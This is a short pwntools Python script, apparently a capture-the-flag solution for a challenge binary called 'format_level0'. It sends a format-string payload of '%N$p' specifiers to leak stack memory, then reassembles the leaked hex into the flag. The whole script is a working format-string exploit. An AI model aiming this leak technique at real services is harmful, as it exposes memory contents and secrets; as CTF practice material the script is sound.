#! /usr/bin/python3
from pwn import *
#from Crypto.Util.number import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
#libc = ELF('./')
#elf = ELF('./')

context.log_level = 'debug'
debug = 1

if debug:
    io = process('./format_level0')
else:
    io = remote('')

def p():
    gdb.attach(proc.pidof(io)[0])

#one_gadget = [,,]
payload = b"%7$p%8$p%9$p%10$p%11$p%12$p%13$p%14$p%15$p"
io.sendlineafter(b"put your name:", payload)
io.recvuntil(b"Your name is: 0x")
flag = ""

for i in range(4):
    tmp = io.recvuntil(b"0x", drop=True)
    tmp = bytes.fromhex(tmp.decode()).decode()
    tmp = tmp[::-1]
    flag += tmp

tmp = io.recv(5)[1:]
tmp = bytes.fromhex(tmp.decode()).decode()
tmp = tmp[::-1]
flag += tmp

success("flag -->" + flag)





io.interactive()

